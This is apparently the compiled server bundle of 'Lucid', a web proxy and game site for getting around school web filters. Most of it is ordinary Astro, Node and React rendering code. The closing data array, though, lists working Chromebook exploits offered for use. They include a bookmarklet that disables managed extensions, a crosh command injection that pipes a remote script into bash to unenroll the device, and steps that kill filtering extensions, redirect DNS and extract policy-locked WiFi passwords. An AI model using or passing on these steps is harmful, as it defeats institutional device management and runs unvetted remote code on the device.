          body = Buffer.concat([body, d]);
        });
        req.on("end", () => {
          resolve(body);
        });
        req.on("error", (err) => {
          reject(err);
        });
      });
      return reqBodyComplete.then(() => {
        return super.render(
          req instanceof Request ? req : createRequestFromNodeRequest(req, body),
          routeData
        );
      });
    }
    return super.render(
      req instanceof Request ? req : createRequestFromNodeRequest(req),
      routeData
    );
  }
}

const canUseSymbol = typeof Symbol === "function" && typeof Symbol.for === "function";
const canUseAsyncIteratorSymbol = canUseSymbol && Symbol.asyncIterator;
function isBuffer(value) {
  return value != null && value.constructor != null && typeof value.constructor.isBuffer === "function" && value.constructor.isBuffer(value);
}
function isNodeResponse(value) {
  return !!value.body;
}
function isReadableStream(value) {
  return !!value.getReader;
}
function isAsyncIterableIterator(value) {
  return !!(canUseAsyncIteratorSymbol && value[Symbol.asyncIterator]);
}
function isStreamableBlob(value) {
  return !!value.stream;
}
function isBlob(value) {
  return !!value.arrayBuffer;
}
function isNodeReadableStream(value) {
  return !!value.pipe;
}
function readerIterator(reader) {
  const iterator = {
    next() {
      return reader.read();
    }
  };
  if (canUseAsyncIteratorSymbol) {
    iterator[Symbol.asyncIterator] = function() {
      return this;
    };
  }
  return iterator;
}
function promiseIterator(promise) {
  let resolved = false;
  const iterator = {
    next() {
      if (resolved)
        return Promise.resolve({
          value: void 0,
          done: true
        });
      resolved = true;
      return new Promise(function(resolve, reject) {
        promise.then(function(value) {
          resolve({ value, done: false });
        }).catch(reject);
      });
    }
  };
  if (canUseAsyncIteratorSymbol) {
    iterator[Symbol.asyncIterator] = function() {
      return this;
    };
  }
  return iterator;
}
function nodeStreamIterator(stream) {
  let cleanup = null;
  let error = null;
  let done = false;
  const data = [];
  const waiting = [];
  function onData(chunk) {
    if (error)
      return;
    if (waiting.length) {
      const shiftedArr = waiting.shift();
      if (Array.isArray(shiftedArr) && shiftedArr[0]) {
        return shiftedArr[0]({ value: chunk, done: false });
      }
    }
    data.push(chunk);
  }
  function onError(err) {
    error = err;
    const all = waiting.slice();
    all.forEach(function(pair) {
      pair[1](err);
    });
    !cleanup || cleanup();
  }
  function onEnd() {
    done = true;
    const all = waiting.slice();
    all.forEach(function(pair) {
      pair[0]({ value: void 0, done: true });
    });
    !cleanup || cleanup();
  }
  cleanup = function() {
    cleanup = null;
    stream.removeListener("data", onData);
    stream.removeListener("error", onError);
    stream.removeListener("end", onEnd);
    stream.removeListener("finish", onEnd);
    stream.removeListener("close", onEnd);
  };
  stream.on("data", onData);
  stream.on("error", onError);
  stream.on("end", onEnd);
  stream.on("finish", onEnd);
  stream.on("close", onEnd);
  function getNext() {
    return new Promise(function(resolve, reject) {
      if (error)
        return reject(error);
      if (data.length)
        return resolve({ value: data.shift(), done: false });
      if (done)
        return resolve({ value: void 0, done: true });
      waiting.push([resolve, reject]);
    });
  }
  const iterator = {
    next() {
      return getNext();
    }
  };
  if (canUseAsyncIteratorSymbol) {
    iterator[Symbol.asyncIterator] = function() {
      return this;
    };
  }
  return iterator;
}
function asyncIterator(source) {
  const iterator = source[Symbol.asyncIterator]();
  return {
    next() {
      return iterator.next();
    },
    [Symbol.asyncIterator]() {
      return this;
    }
  };
}
function responseIterator(response) {
  let body = response;
  if (isNodeResponse(response))
    body = response.body;
  if (isBuffer(body))
    body = Readable.from(body);
  if (isAsyncIterableIterator(body))
    return asyncIterator(body);
  if (isReadableStream(body))
    return readerIterator(body.getReader());
  if (isStreamableBlob(body)) {
    return readerIterator(body.stream().getReader());
  }
  if (isBlob(body))
    return promiseIterator(body.arrayBuffer());
  if (isNodeReadableStream(body))
    return nodeStreamIterator(body);
  throw new Error("Unknown body type for responseIterator. Please pass a streamable response.");
}

function middleware_default(app) {
  return async function(req, res, next) {
    try {
      const route = app.match(req);
      if (route) {
        try {
          const response = await app.render(req);
          await writeWebResponse(app, res, response);
        } catch (err) {
          if (next) {
            next(err);
          } else {
            throw err;
          }
        }
      } else if (next) {
        return next();
      } else {
        res.writeHead(404);
        res.end("Not found");
      }
    } catch (err) {
      if (!res.headersSent) {
        res.writeHead(500, `Server error`);
        res.end();
      }
    }
  };
}
async function writeWebResponse(app, res, webResponse) {
  const { status, headers } = webResponse;
  if (app.setCookieHeaders) {
    const setCookieHeaders = Array.from(app.setCookieHeaders(webResponse));
    if (setCookieHeaders.length) {
      res.setHeader("Set-Cookie", setCookieHeaders);
    }
  }
  res.writeHead(status, Object.fromEntries(headers.entries()));
  if (webResponse.body) {
    for await (const chunk of responseIterator(webResponse)) {
      res.write(chunk);
    }
  }
  res.end();
}

function createServer({ client, port, host, removeBase }, handler) {
  const listener = (req, res) => {
    if (req.url) {
      const pathname = "/" + removeBase(req.url);
      const stream = send(req, encodeURI(pathname), {
        root: fileURLToPath(client),
        dotfiles: "deny"
      });
      let forwardError = false;
      stream.on("error", (err) => {
        if (forwardError) {
          console.error(err.toString());
          res.writeHead(500);
          res.end("Internal server error");
          return;
        }
        handler(req, res);
      });
      stream.on("file", () => {
        forwardError = true;
      });
      stream.pipe(res);
    } else {
      handler(req, res);
    }
  };
  let httpServer;
  if (process.env.SERVER_CERT_PATH && process.env.SERVER_KEY_PATH) {
    httpServer = https.createServer(
      {
        key: fs.readFileSync(process.env.SERVER_KEY_PATH),
        cert: fs.readFileSync(process.env.SERVER_CERT_PATH)
      },
      listener
    );
  } else {
    httpServer = http.createServer(listener);
  }
  httpServer.listen(port, host);
  const closed = new Promise((resolve, reject) => {
    httpServer.addListener("close", resolve);
    httpServer.addListener("error", reject);
  });
  return {
    host,
    port,
    closed() {
      return closed;
    },
    server: httpServer,
    stop: async () => {
      await new Promise((resolve, reject) => {
        httpServer.close((err) => err ? reject(err) : resolve(void 0));
      });
    }
  };
}

function resolvePaths(options) {
  const clientURLRaw = new URL(options.client);
  const serverURLRaw = new URL(options.server);
  const rel = path.relative(fileURLToPath(serverURLRaw), fileURLToPath(clientURLRaw));
  const serverEntryURL = new URL(import.meta.url);
  const clientURL = new URL(appendForwardSlash(rel), serverEntryURL);
  return {
    client: clientURL
  };
}
function appendForwardSlash(pth) {
  return pth.endsWith("/") ? pth : pth + "/";
}
function getResolvedHostForHttpServer(host) {
  if (host === false) {
    return "127.0.0.1";
  } else if (host === true) {
    return void 0;
  } else {
    return host;
  }
}
function startServer(app, options) {
  const port = process.env.PORT ? Number(process.env.PORT) : options.port ?? 8080;
  const { client } = resolvePaths(options);
  const handler = middleware_default(app);
  const host = getResolvedHostForHttpServer(
    process.env.HOST !== void 0 && process.env.HOST !== "" ? process.env.HOST : options.host
  );
  const server = createServer(
    {
      client,
      port,
      host,
      removeBase: app.removeBase.bind(app)
    },
    handler
  );
  console.log(`Server listening on http://${host}:${port}`);
  return server.closed();
}

polyfill(globalThis, {
  exclude: "window document"
});
function createExports(manifest) {
  const app = new NodeApp(manifest);
  return {
    handler: middleware_default(app)
  };
}
function start(manifest, options) {
  if (options.mode !== "standalone" || process.env.ASTRO_NODE_AUTOSTART === "disabled") {
    return;
  }
  const app = new NodeApp(manifest);
  startServer(app, options);
}

const adapter = /*#__PURE__*/Object.freeze(/*#__PURE__*/Object.defineProperty({
  __proto__: null,
  createExports,
  start
}, Symbol.toStringTag, { value: 'Module' }));

/**
 * Astro passes `children` as a string of HTML, so we need
 * a wrapper `div` to render that content as VNodes.
 *
 * As a bonus, we can signal to React that this subtree is
 * entirely static and will never change via `shouldComponentUpdate`.
 */
const StaticHtml = ({ value, name }) => {
	if (!value) return null;
	return createElement('astro-slot', {
		name,
		suppressHydrationWarning: true,
		dangerouslySetInnerHTML: { __html: value },
	});
};

/**
 * This tells React to opt-out of re-rendering this subtree,
 * In addition to being a performance optimization,
 * this also allows other frameworks to attach to `children`.
 *
 * See https://preactjs.com/guide/v8/external-dom-mutations
 */
StaticHtml.shouldComponentUpdate = () => false;

const slotName$1 = (str) => str.trim().replace(/[-_]([a-z])/g, (_, w) => w.toUpperCase());
const reactTypeof = Symbol.for('react.element');

function errorIsComingFromPreactComponent(err) {
	return (
		err.message &&
		(err.message.startsWith("Cannot read property '__H'") ||
			err.message.includes("(reading '__H')"))
	);
}

async function check$1(Component, props, children) {
	// Note: there are packages that do some unholy things to create "components".
	// Checking the $$typeof property catches most of these patterns.
	if (typeof Component === 'object') {
		const $$typeof = Component['$$typeof'];
		return $$typeof && $$typeof.toString().slice('Symbol('.length).startsWith('react');
	}
	if (typeof Component !== 'function') return false;

	if (Component.prototype != null && typeof Component.prototype.render === 'function') {
		return React.Component.isPrototypeOf(Component) || React.PureComponent.isPrototypeOf(Component);
	}

	let error = null;
	let isReactComponent = false;
	function Tester(...args) {
		try {
			const vnode = Component(...args);
			if (vnode && vnode['$$typeof'] === reactTypeof) {
				isReactComponent = true;
			}
		} catch (err) {
			if (!errorIsComingFromPreactComponent(err)) {
				error = err;
			}
		}

		return React.createElement('div');
	}

	await renderToStaticMarkup$1(Tester, props, children, {});

	if (error) {
		throw error;
	}
	return isReactComponent;
}

async function getNodeWritable() {
	let nodeStreamBuiltinModuleName = 'stream';
	let { Writable } = await import(/* @vite-ignore */ nodeStreamBuiltinModuleName);
	return Writable;
}

async function renderToStaticMarkup$1(Component, props, { default: children, ...slotted }, metadata) {
	delete props['class'];
	const slots = {};
	for (const [key, value] of Object.entries(slotted)) {
		const name = slotName$1(key);
		slots[name] = React.createElement(StaticHtml, { value, name });
	}
	// Note: create newProps to avoid mutating `props` before they are serialized
	const newProps = {
		...props,
		...slots,
	};
	if (children != null) {
		newProps.children = React.createElement(StaticHtml, { value: children });
	}
	const vnode = React.createElement(Component, newProps);
	let html;
	if (metadata && metadata.hydrate) {
		if ('renderToReadableStream' in ReactDOM) {
			html = await renderToReadableStreamAsync(vnode);
		} else {
			html = await renderToPipeableStreamAsync(vnode);
		}
	} else {
		if ('renderToReadableStream' in ReactDOM) {
			html = await renderToReadableStreamAsync(vnode);
		} else {
			html = await renderToStaticNodeStreamAsync(vnode);
		}
	}
	return { html };
}

async function renderToPipeableStreamAsync(vnode) {
	const Writable = await getNodeWritable();
	let html = '';
	return new Promise((resolve, reject) => {
		let error = undefined;
		let stream = ReactDOM.renderToPipeableStream(vnode, {
			onError(err) {
				error = err;
				reject(error);
			},
			onAllReady() {
				stream.pipe(
					new Writable({
						write(chunk, _encoding, callback) {
							html += chunk.toString('utf-8');
							callback();
						},
						destroy() {
							resolve(html);
						},
					})
				);
			},
		});
	});
}

async function renderToStaticNodeStreamAsync(vnode) {
	const Writable = await getNodeWritable();
	let html = '';
	return new Promise((resolve, reject) => {
		let stream = ReactDOM.renderToStaticNodeStream(vnode);
		stream.on('error', (err) => {
			reject(err);
		});
		stream.pipe(
			new Writable({
				write(chunk, _encoding, callback) {
					html += chunk.toString('utf-8');
					callback();
				},
				destroy() {
					resolve(html);
				},
			})
		);
	});
}

/**
 * Use a while loop instead of "for await" due to cloudflare and Vercel Edge issues
 * See https://github.com/facebook/react/issues/24169
 */
async function readResult(stream) {
	const reader = stream.getReader();
	let result = '';
	const decoder = new TextDecoder('utf-8');
	while (true) {
		const { done, value } = await reader.read();
		if (done) {
			if (value) {
				result += decoder.decode(value);
			} else {
				// This closes the decoder
				decoder.decode(new Uint8Array());
			}

			return result;
		}
		result += decoder.decode(value, { stream: true });
	}
}

async function renderToReadableStreamAsync(vnode) {
	return await readResult(await ReactDOM.renderToReadableStream(vnode));
}

const _renderer1 = {
	check: check$1,
	renderToStaticMarkup: renderToStaticMarkup$1,
};

const slotName = (str) => str.trim().replace(/[-_]([a-z])/g, (_, w) => w.toUpperCase());
async function check(Component, props, { default: children = null, ...slotted } = {}) {
  if (typeof Component !== "function")
    return false;
  const slots = {};
  for (const [key, value] of Object.entries(slotted)) {
    const name = slotName(key);
    slots[name] = value;
  }
  try {
    const result = await Component({ ...props, ...slots, children });
    return result[AstroJSX];
  } catch (e) {
  }
  return false;
}
async function renderToStaticMarkup(Component, props = {}, { default: children = null, ...slotted } = {}) {
  const slots = {};
  for (const [key, value] of Object.entries(slotted)) {
    const name = slotName(key);
    slots[name] = value;
  }
  const { result } = this;
  const html = await renderJSX(result, createVNode(Component, { ...props, ...slots, children }));
  return { html };
}
var server_default = {
  check,
  renderToStaticMarkup
};

function Navbar() {
  return /* @__PURE__ */ jsx(Fragment$1, {
    children: /* @__PURE__ */ jsxs("div", {
      className: "navbar bg-base-100",
      children: [/* @__PURE__ */ jsx("div", {
        className: "navbar-start",
        children: /* @__PURE__ */ jsxs("div", {
          className: "dropdown",
          children: [/* @__PURE__ */ jsx("label", {
            tabIndex: 0,
            className: "btn btn-ghost btn-circle",
            children: /* @__PURE__ */ jsx("svg", {
              xmlns: "http://www.w3.org/2000/svg",
              className: "h-5 w-5",
              fill: "none",
              viewBox: "0 0 24 24",
              stroke: "currentColor",
              children: /* @__PURE__ */ jsx("path", {
                strokeLinecap: "round",
                strokeLinejoin: "round",
                strokeWidth: "2",
                d: "M4 6h16M4 12h16M4 18h7"
              })
            })
          }), /* @__PURE__ */ jsxs("ul", {
            tabIndex: 0,
            className: "menu menu-compact dropdown-content mt-3 p-2 shadow bg-base-100 rounded-box w-52",
            children: [/* @__PURE__ */ jsx("li", {
              children: /* @__PURE__ */ jsx("a", {
                href: "/",
                children: "Home"
              })
            }), /* @__PURE__ */ jsx("li", {
              children: /* @__PURE__ */ jsx("a", {
                href: "/proxy",
                children: "Proxy"
              })
            }), /* @__PURE__ */ jsx("li", {
              children: /* @__PURE__ */ jsx("a", {
                href: "/games",
                children: "Games"
              })
            }), /* @__PURE__ */ jsx("li", {
              children: /* @__PURE__ */ jsx("a", {
                href: "/bypass",
                children: "Bypasses"
              })
            }), /* @__PURE__ */ jsx("li", {
              children: /* @__PURE__ */ jsx("a", {
                href: "options",
                children: "Options"
              })
            }), /* @__PURE__ */ jsx("li", {
              children: /* @__PURE__ */ jsx("a", {
                href: "/community",
                children: "Community"
              })
            })]
          })]
        })
      }), /* @__PURE__ */ jsx("div", {
        className: "navbar-center",
        children: /* @__PURE__ */ jsx("a", {
          className: "btn btn-ghost normal-case text-xl",
          href: "/",
          children: "Lucid"
        })
      }), /* @__PURE__ */ jsx("div", {
        className: "navbar-end"
      })]
    })
  });
}
__astro_tag_component__(Navbar, "@astrojs/react");

function Hero() {
  return /* @__PURE__ */ jsx(Fragment$1, {
    children: /* @__PURE__ */ jsx("div", {
      className: "hero min-h-screen bg-base-200",
      children: /* @__PURE__ */ jsx("div", {
        className: "hero-content text-center",
        children: /* @__PURE__ */ jsxs("div", {
          className: "max-w-md",
          children: [/* @__PURE__ */ jsx("h1", {
            className: "text-5xl font-bold",
            children: "Lucid"
          }), /* @__PURE__ */ jsx("p", {
            className: "py-6",
            children: "An internet utility service capable of circumventing internet censorship measures."
          }), /* @__PURE__ */ jsx("button", {
            className: "btn btn-active",
            id: "getStarted",
            children: "Get Started"
          })]
        })
      })
    })
  });
}
__astro_tag_component__(Hero, "@astrojs/react");

const $$Astro$7 = createAstro("D:/Lucid-New/src/pages/index.astro", "", "file:///D:/Lucid-New/");
const $$Index = createComponent(async ($$result, $$props, $$slots) => {
  const Astro2 = $$result.createAstro($$Astro$7, $$props, $$slots);
  Astro2.self = $$Index;
  return renderTemplate`<html lang="en" id="wrap">
	<head>
		<link rel="manifest" href="/manifest.json">
		<meta charset="utf-8">
		<link rel="icon" type="image/svg+xml" href="/favicon.svg">
		<link rel="apple-touch-icon" href="images/icons/icon-192x192.png">
		<link rel="apple-touch-icon" href="images/icons/icon-512x512.png">
		<meta name="viewport" content="width=device-width">
		<meta name="generator"${addAttribute(Astro2.generator, "content")}>
		<meta property="og:title" content="Lucid">
		<meta property="og:site_name" content="Lucid">
		<meta name="keywords" content="unblocker, games, proxy, vpn, nova, lucid unblocker, lucid">
		<meta name="description" content="Lucid is an internet utility that provides more functionality for users. A Nova Service. ">
		<title>Lucid</title>
	${renderHead($$result)}</head>
	<body>
		

		${renderComponent($$result, "Navbar", Navbar, {})}
		${renderComponent($$result, "Hero", Hero, {})}
		
		${maybeRenderHead($$result)}
	</body>
</html>`;
}, "D:/Lucid-New/src/pages/index.astro");

const $$file$7 = "D:/Lucid-New/src/pages/index.astro";
const $$url$7 = "";

const _page0 = /*#__PURE__*/Object.freeze(/*#__PURE__*/Object.defineProperty({
  __proto__: null,
  default: $$Index,
  file: $$file$7,
  url: $$url$7
}, Symbol.toStringTag, { value: 'Module' }));

var __freeze$1 = Object.freeze;
var __defProp$1 = Object.defineProperty;
var __template$1 = (cooked, raw) => __freeze$1(__defProp$1(cooked, "raw", { value: __freeze$1(raw || cooked.slice()) }));
var _a$1;
const $$Astro$6 = createAstro("D:/Lucid-New/src/pages/ruffleloader.astro", "", "file:///D:/Lucid-New/");
const $$Ruffleloader = createComponent(async ($$result, $$props, $$slots) => {
  const Astro2 = $$result.createAstro($$Astro$6, $$props, $$slots);
  Astro2.self = $$Ruffleloader;
  return renderTemplate(_a$1 || (_a$1 = __template$1(['<html lang="en" id="wrap">\n	<head>\n		<link rel="manifest" href="/manifest.json">\n		<meta charset="utf-8">\n		<link rel="icon" type="image/svg+xml" href="/favicon.svg">\n		<link rel="apple-touch-icon" href="images/icons/icon-192x192.png">\n		<link rel="apple-touch-icon" href="images/icons/icon-512x512.png">\n		<meta name="viewport" content="width=device-width">\n		<meta name="generator"', '>\n		<meta property="og:title" content="Lucid">\n		<meta property="og:site_name" content="Lucid">\n		<meta name="keywords" content="unblocker, games, proxy, vpn, nova, lucid unblocker, lucid">\n		<meta name="description" content="Lucid is an internet utility that provides more functionality for users. A Nova Service. ">\n		<title>Lucid</title>\n	', "</head>\n	<body>\n		\n\n		", '\n        <div id="container"> </div>\n		\n		\n    \n        <!-- its broken for some reason?? <script src="ruffle/ruffle.js"><\/script> -->\n        ', "\n    \n	</body>\n</html>"])), addAttribute(Astro2.generator, "content"), renderHead($$result), renderComponent($$result, "Navbar", Navbar, {}), maybeRenderHead($$result));
}, "D:/Lucid-New/src/pages/ruffleloader.astro");

const $$file$6 = "D:/Lucid-New/src/pages/ruffleloader.astro";
const $$url$6 = "/ruffleloader";

const _page1 = /*#__PURE__*/Object.freeze(/*#__PURE__*/Object.defineProperty({
  __proto__: null,
  default: $$Ruffleloader,
  file: $$file$6,
  url: $$url$6
}, Symbol.toStringTag, { value: 'Module' }));

const $$Astro$5 = createAstro("D:/Lucid-New/src/pages/community.astro", "", "file:///D:/Lucid-New/");
const $$Community = createComponent(async ($$result, $$props, $$slots) => {
  const Astro2 = $$result.createAstro($$Astro$5, $$props, $$slots);
  Astro2.self = $$Community;
  return renderTemplate`${maybeRenderHead($$result)}

`;
}, "D:/Lucid-New/src/pages/community.astro");

const $$file$5 = "D:/Lucid-New/src/pages/community.astro";
const $$url$5 = "/community";

const _page2 = /*#__PURE__*/Object.freeze(/*#__PURE__*/Object.defineProperty({
  __proto__: null,
  default: $$Community,
  file: $$file$5,
  url: $$url$5
}, Symbol.toStringTag, { value: 'Module' }));

const $$Astro$4 = createAstro("D:/Lucid-New/src/pages/emuloader.astro", "", "file:///D:/Lucid-New/");
const $$Emuloader = createComponent(async ($$result, $$props, $$slots) => {
  const Astro2 = $$result.createAstro($$Astro$4, $$props, $$slots);
  Astro2.self = $$Emuloader;
  return renderTemplate`${maybeRenderHead($$result)}<h1>
    unfinished
</h1>`;
}, "D:/Lucid-New/src/pages/emuloader.astro");

const $$file$4 = "D:/Lucid-New/src/pages/emuloader.astro";
const $$url$4 = "/emuloader";

const _page3 = /*#__PURE__*/Object.freeze(/*#__PURE__*/Object.defineProperty({
  __proto__: null,
  default: $$Emuloader,
  file: $$file$4,
  url: $$url$4
}, Symbol.toStringTag, { value: 'Module' }));

function SettingsHero() {
  return /* @__PURE__ */ jsx(Fragment$1, {
    children: /* @__PURE__ */ jsx("div", {
      className: "hero min-h-screen bg-base-200",
      children: /* @__PURE__ */ jsx("div", {
        className: "hero-content text-center",
        children: /* @__PURE__ */ jsxs("div", {
          className: "max-w-md",
          children: [/* @__PURE__ */ jsx("h1", {
            className: "text-5xl font-bold",
            children: "Options"
          }), /* @__PURE__ */ jsx("p", {
            className: "py-6",
            children: "Pick your preferences with the proxy in this space."
          }), /* @__PURE__ */ jsx("div", {
            className: "divider",
            children: "Proxy Select"
          }), /* @__PURE__ */ jsxs("select", {
            className: "select w-full max-w-xs",
            id: "proxySelect",
            children: [/* @__PURE__ */ jsx("option", {
              selected: true,
              children: "UltraViolet"
            }), /* @__PURE__ */ jsx("option", {
              children: "Dynamic Interception Proxy"
            })]
          }), /* @__PURE__ */ jsx("div", {
            className: "divider",
            children: "Cloaking"
          }), /* @__PURE__ */ jsxs("select", {
            className: "select w-full max-w-xs",
            id: "cloakingSelect",
            children: [/* @__PURE__ */ jsx("option", {
              selected: true,
              children: "Plain"
            }), /* @__PURE__ */ jsx("option", {
              children: "About:Blank"
            })]
          }), /* @__PURE__ */ jsx("div", {
            className: "divider",
            children: "Theme"
          }), /* @__PURE__ */ jsxs("select", {
            className: "select w-full max-w-xs",
            id: "themeSelect",
            children: [/* @__PURE__ */ jsx("option", {
              selected: true,
              children: "Luxury"
            }), /* @__PURE__ */ jsx("option", {
              children: "Light"
            }), /* @__PURE__ */ jsx("option", {
              children: "Cupcake"
            }), /* @__PURE__ */ jsx("option", {
              children: "Bumblebee"
            }), /* @__PURE__ */ jsx("option", {
              children: "Emerald"
            }), /* @__PURE__ */ jsx("option", {
              children: "Corporate"
            }), /* @__PURE__ */ jsx("option", {
              children: "Synthwave"
            }), /* @__PURE__ */ jsx("option", {
              children: "Retro"
            }), /* @__PURE__ */ jsx("option", {
              children: "Cyberpunk"
            }), /* @__PURE__ */ jsx("option", {
              children: "Valentine"
            }), /* @__PURE__ */ jsx("option", {
              children: "Halloween"
            }), /* @__PURE__ */ jsx("option", {
              children: "Garden"
            }), /* @__PURE__ */ jsx("option", {
              children: "Forest"
            }), /* @__PURE__ */ jsx("option", {
              children: "Aqua"
            }), /* @__PURE__ */ jsx("option", {
              children: "Lofi"
            }), /* @__PURE__ */ jsx("option", {
              children: "Pastel"
            }), /* @__PURE__ */ jsx("option", {
              children: "Fantasy"
            }), /* @__PURE__ */ jsx("option", {
              children: "Emerald"
            }), /* @__PURE__ */ jsx("option", {
              children: "Black"
            }), /* @__PURE__ */ jsx("option", {
              children: "Dracula"
            }), /* @__PURE__ */ jsx("option", {
              children: "Cmyk"
            }), /* @__PURE__ */ jsx("option", {
              children: "Autumn"
            }), /* @__PURE__ */ jsx("option", {
              children: "Buisness"
            }), /* @__PURE__ */ jsx("option", {
              children: "Acid"
            }), /* @__PURE__ */ jsx("option", {
              children: "Lemonade"
            }), /* @__PURE__ */ jsx("option", {
              children: "Night"
            }), /* @__PURE__ */ jsx("option", {
              children: "Coffee"
            }), /* @__PURE__ */ jsx("option", {
              children: "Winter"
            })]
          })]
        })
      })
    })
  });
}
__astro_tag_component__(SettingsHero, "@astrojs/react");

const $$Astro$3 = createAstro("D:/Lucid-New/src/pages/options.astro", "", "file:///D:/Lucid-New/");
const $$Options = createComponent(async ($$result, $$props, $$slots) => {
  const Astro2 = $$result.createAstro($$Astro$3, $$props, $$slots);
  Astro2.self = $$Options;
  return renderTemplate`<html lang="en" id="wrap">
	<head>
		<meta charset="utf-8">
		<link rel="icon" type="image/svg+xml" href="/favicon.svg">
		<meta name="viewport" content="width=device-width">
		<meta name="generator"${addAttribute(Astro2.generator, "content")}>
		<meta property="og:title" content="Lucid">
		<meta property="og:site_name" content="Lucid">
		<meta name="keywords" content="unblocker, games, proxy, vpn, nova, lucid unblocker, lucid">
		<meta name="description" content="Lucid is an internet utility that provides more functionality for users. A Nova Service. ">
		<title>Lucid</title>
	${renderHead($$result)}</head>
	<body>
		
		${renderComponent($$result, "Navbar", Navbar, {})}
		${renderComponent($$result, "SettingsHero", SettingsHero, {})}

		${maybeRenderHead($$result)}
	</body>
</html>`;
}, "D:/Lucid-New/src/pages/options.astro");

const $$file$3 = "D:/Lucid-New/src/pages/options.astro";
const $$url$3 = "/options";

const _page4 = /*#__PURE__*/Object.freeze(/*#__PURE__*/Object.defineProperty({
  __proto__: null,
  default: $$Options,
  file: $$file$3,
  url: $$url$3
}, Symbol.toStringTag, { value: 'Module' }));

const Data$1 = [
	{
		title: "LTBEEF",
		description: "An exploit that allows you to disable managed extensions on versions under v106",
		image: "/images/ltbeef.png",
		instructions: "1. Get the extension ids from chrome://extensions. Clicking Details and copying everything after = | 2. Go to https://chrome.google.com/webstorexyz\n  | 3. Run the bookmarklet below.",
		rating: "4",
		code: "javascript:prompt('Extension IDs here: (seperated by commas)').split(',').forEach(i=>{chrome.management.setEnabled(i.trim(),!1)})"
	},
	{
		title: "Shroot",
		description: "An exploit that allows you to get full control of your Chromebook with Shell / Root and unenrolls it. Works on version v101",
		image: "/images/shroot.png",
		instructions: "* DISCLAIMER DO NOT DO THIS UNLESS YOU HAVE ADVANCED KNOWLEDGE OF CHROMEOS * UnEnroll: 1. Open Crosh & Type in set_cellular_ppp \\';bash;exit;\\' and enter | 2. Type in bash <(curl https://coolelectronics.me/unroll) and enter | 3. Wait for the script to finish and then powerwash chromebook. ReEnroll: 1. Enable DevMode (ESC+POWER+RELOAD, Ctrl D and enter on recovery screen) | 2. When in chrome, Open Crosh (ctrl + alt + t) | 3. Type in Shell & Type in sudo vpd i RW_VPD -s check_enrollment=1 | 4. Powerwash Again ",
		code: "set_cellular_ppp \\';bash;exit;\\'\n bash <(curl https://coolelectronics.me/unroll)\n Shell\n sudo vpd i RW_VPD -s check_enrollment=1",
		rating: "5"
	},
	{
		title: "Swamp",
		description: "An exploit that allows you to disable managed extensions, run bookmarklets on pages (even when blocked), break goguardian until powerwash, access to most of chrome api, and run a custom filter to block like a DNS. Works on any version except for v104",
		image: "/images/swamp.png",
		instructions: "1. Go to the ChromeOS settings app and search for 'DNS', then click the first option | 2. Click 'Custom name servers' (note that this will likely not work on a school network) | 3. Set all four boxes to 0.0.0.0 and wait a few seconds | 4.  Set the first box to 150.136.6.90 (credit to The Greater Giant for hosting this server) | 5. In a new tab, go to https://tinyurl.com/s-w-a-m-p (or chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/background.html) (should be a blank white screen) | 6. On this page, press ctrl+shift+r and wait for the page to finish loading (it should still be a blank screen) | 7. In the same tab, go to https://ssl.google-analytics.com/swamp (and maybe do ctrl+shift+r) | 8. You should get a warning message from Chrome (if you do not, then there is an issue with your DNS setup, try a hotspot maybe) | 9. Type thisisunsafe on your keyboard to bypass this warning (make sure you don't typo) | 10. You should now be in [swamp]! If you can keep pressing ctrl+shift+r on the extension page and [swamp] keeps loading, then you've set it up correctly. If it doesn't, then you'll have to go back to the Google Analytics link and do thisisunsafe again. ",
		rating: "4"
	},
	{
		title: "KillCurly",
		description: "An exploit that allows you to kill Securly, Cisco Umbrella, Palo Alto, and Hapara",
		image: "/images/killcurly.png",
		instructions: "1. Go to chrome://settings/signOut and click the blue button. | 2. Go to chrome://restart or go to Securly details in chrome://extensions and click Allow access to file URLs or use chrome://kill on one of its extension pages. | 3. Go to /addsession and add your school account back.",
		rating: "4"
	},
	{
		title: "Downgrading",
		description: "A method to reduce your chrome version allowing you to get access to versions that have exploits on them.",
		image: "/images/downgrading.png",
		instructions: "1. Go to chrome://version and look for your version. | 2. On your personal computer go to anylucidurl.com/downgrade and do ctrl + f plus your board and download the recovery media you want. | 3. On your personal computer download the chrome recovery utlity extension. Start the extension, click use local image, and select the recovery media you downloaded and then use your usb/sd drive. | 4. press esc + refresh + power on your chromebook and follow the prompts | 5. Once your chromebook is done recovering sin into your wifi and proceed to press ctrl + alt + e on the checking for updates screen. A blue briefcase will be on the enterprise enrollment screen.",
		rating: "5"
	},
	{
		title: "UpdateBlocker",
		description: "An exploit that allows you to block automatic chromeos updates. Works on versions after v84",
		image: "/images/updateblocker.png",
		instructions: "View /updateblocker for detailed instructions + tool.",
		rating: "3"
	},
	{
		title: "DNS Bypass",
		description: "A method that allows you to disable whatever blocker your school uses.",
		instructions: "1. Go to chrome://os-settings/networks?type=WiFi | 2. Click on the current WiFi you are using. | 3. Hit the button that says Network | 4. Scroll down and hit Custom Nameservers | 5. In each of the 4 boxes paste one of the DNS addresses of your choice. ",
		image: "/images/dnsbypass.png",
		rating: "4"
	},
	{
		title: "Inspect LTBEEF",
		description: "A variation of the exploit LTBEEF which allows you to disable managed extensions",
		instructions: "1. Go to https://tinyurl.com/i-ltbeef | 2. Run the LTBEEF code found below. ",
		code: "chrome.management.setEnabled('extensionid',!1)",
		image: "/images/inspectltbeef.png",
		rating: "4"
	},
	{
		title: "Wifi Password",
		description: "A method to get access to the wifi password of a policy locked wifi network.",
		image: "/images/wifipassword.png",
		instructions: "1. Go to chrome://net-export and click select raw bytes and start logging, go to chrome://policy reload policies and wait for it to finish | 2. Go to chrome://net-exports and hit stop recording. | 3. Go to /wifipass and upload the log there.",
		rating: "3"
	},
	{
		title: "AddSession",
		description: "An exploit that allows you to add a personal account to websites like Gmail or YouTube",
		image: "/images/addsession.png",
		instructions: "1. Go to chrome://settings/signOut | 2. Clear your cookies on google.com. | 3. Then go to tinyurl.com/addsession to add an account",
		rating: "2"
	},
	{
		title: "PlaystoreBypass",
		description: "An exploit that allows you to gain access to a completely unblocked PlayStore",
		image: "/images/playstorebypass.png",
		instructions: "1. Downgrade | 2. Open Playstore downloads, open settings, click on Apps, and then the arrow to Manage Android Preferences | 3. Click on accounts and add personal account. | 4. Open playstore and click on 3 lines on the top left corner. Select the account you just added.",
		rating: "3"
	},
	{
		title: "WebstoreBypass",
		description: "An exploit that allows you to gain access to a completely unblocked Webstore.",
		image: "/images/webstorebypass.png",
